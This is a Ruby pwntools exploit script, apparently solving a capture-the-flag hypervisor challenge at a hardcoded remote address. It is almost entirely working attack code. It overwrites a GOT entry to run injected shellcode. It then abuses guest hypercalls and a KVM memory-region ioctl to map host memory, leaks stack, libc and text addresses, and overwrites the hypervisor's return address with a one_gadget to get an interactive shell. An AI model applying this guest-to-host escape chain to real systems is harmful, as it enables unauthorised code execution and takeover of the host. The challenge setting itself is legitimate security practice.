#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '35.200.23.198', 31733
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
# $z = Tubes::Process.new('../release/user.elf')
def z;$z;end
@p = '../release/user.elf'
# def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = 'amd64'

stack_at = 0x2020a4
shellcode_at = 0x2030a4 + 20
target = elf.got.write
payload = "#{(stack_at - target) / 4 - 2}_\\" # top = -xx s.t. stack[top] @ got.printf
payload << 'h:'

payload << "#{shellcode_at - (elf.plt.write + 6)}+h;"

payload << ','

payload = payload.ljust(20, '?')
payload << asm(
  "lea rbp, [rip + shellcode]\n" +
  shellcraft.syscall('SYS_read', 0, 'rbp', 2048) +
  "nop\nnop\nnop\nnop\nshellcode:\n"
)
log.dump payload
fail if payload =~ /\s/
z.puts payload
sleep(0.1)

shellcode = asm(
  shellcraft.syscall('SYS_mmap', 0, 0x1000000, 7, 0, -1, 0) +
  shellcraft.syscall('SYS_read', 0, 'rax', 0x1000000)
)

z.write shellcode
sleep(0.1)

vmfd = @local ? 7 : 4
KVM_SET_USER_MEMORY_REGION = 0x4020AE46
malloc_hook = 0x3ebc30

k_shellcode = "\x90" * 0xe78 + asm(<<-EOS)
  /* print /proc/self/maps */
  lea rdi, [rip+maps]
  and rdi, 0xfffff
  call hp_open
  mov rdi, rax
  mov rsi, 0
  cdq  
  mov dh, 0xff
  call hp_read
  mov rdi, 1
  mov rsi, 0
  mov rdx, rax
  call hp_write

  lea rdi, [rip + uaddr]
  call read_ptr
  lea rdi, [rip + libc_base]
  call read_ptr
  lea rdi, [rip + text_base]
  call read_ptr

  /* play with ioctl */
  mov rdi, #{vmfd}
  mov rsi, #{KVM_SET_USER_MEMORY_REGION}
  lea rcx, [rip + region]
  mov edx, ecx
  call hp_ioctl
  test rax, rax
  jne hp_panic
  call extend_paging
  /* now we should be able to access physical addr 0x2000000 */
  movabs rbp, 0x8002000000
  mov rax, rbp
  /* scan whole stack for the return address of ioctl */
  mov rcx, [rip + text_base]
  add rcx, 0x1743 /* target return address */
loop2:
  cmp rcx, qword ptr [rax]
  je break2
  add rax, 8
  jmp loop2
break2:
  mov rcx, [rip + libc_base]
  add rcx, #{0x4f2c5} /* one_gadget */
  mov qword ptr [rax], rcx
  xor rcx, rcx
  hlt /* let ioctl return */

  extend_paging:
    mov rax, cr3
    add rax, 0x4000
    mov rdx, 0x10 /* i */
  loop:
    cmp rdx, 0x20
    je break
    /* pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (i * KERNEL_PAGING_SIZE); */
    mov rdi, rdx
    imul rdi, 8
    mov rcx, rax
    add rcx, rdi
    mov rdi, rdx
    imul rdi, 0x200000
    or rdi, 1|(1<<1)|(1<<7)
    mov qword ptr [rcx], rdi
    inc rdx
    jmp loop
  break:
    ret

  read_ptr:
    mov esi, edi
    xor rdi, rdi
    mov rdx, 8
    jmp hp_read

  hp_open:
    mov esi, edi
    mov edi, 0x8000
    jmp hypercall

  hp_exit:
    mov esi, edi
    mov edi, 0x8006
    jmp hypercall

  hp_arg3:
    lea rax, [rip+buf]
    mov qword ptr [rax], rdi
    mov qword ptr [rax+8], rsi
    mov qword ptr [rax+16], rdx
    mov esi, eax
    ret

  hp_read:
    call hp_arg3
    mov edi, 0x8001
    jmp hypercall

  hp_write:
    call hp_arg3
    mov edi, 0x8002
    jmp hypercall

  hp_ioctl:
    call hp_arg3
    mov edi, 0x8008
    jmp hypercall

  hp_panic:
    lea rdi, [rip + orz]
    mov eax, edi
    mov edi, 0xffff
    jmp hypercall

  hypercall:
    mov dx, di
    mov eax, esi
    out dx, eax
    in eax, dx
    mov edi, eax
    mov eax, edi
    ret
  maps: .string "/proc/self/maps"
  orz: .string "Orz"
  buf:
    .quad 0
    .quad 0
    .quad 0
  region:
    slot: .long 1
    flags: .long 0
    gpa: .quad 0x2000000
    mem_size: .quad 0x21000
    uaddr: .quad 0
  libc_base: .quad 0
  text_base: .quad 0
EOS
z.write(k_shellcode)
maps = z.gets('[vsyscall]').lines
# puts maps

stack = maps.find { |c| c.include?('[stack]') }.to_i(16)
libc = maps.find { |c| c.include?('/lib/x86_64-linux-gnu/libc') }.to_i(16)
text = maps.find { |c| c.include?('hypervisor.elf') }.to_i(16)
log.dump stack.hex
log.dump libc.hex
log.dump text.hex
z.write flat(stack, libc, text)
z.interact
